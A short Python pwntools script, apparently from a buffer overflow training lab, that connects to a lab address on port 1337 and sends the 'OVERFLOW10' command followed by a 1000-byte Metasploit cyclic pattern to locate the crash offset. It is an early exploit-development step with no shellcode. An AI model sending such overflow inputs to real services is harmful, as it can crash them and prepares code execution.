from pwn import *
import subprocess as sb

ip = "10.10.190.166"
port = 1337
command = "OVERFLOW10 "

pattern_create = "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb"

bof_value = 600

payload = (sb.check_output(["ruby", pattern_create, "-l", str(bof_value + 400)])).strip()

r = remote(host=ip, port=port, ssl=False)
print(r.recv().decode())

input_value = command.encode() + payload
r.sendline(input_value)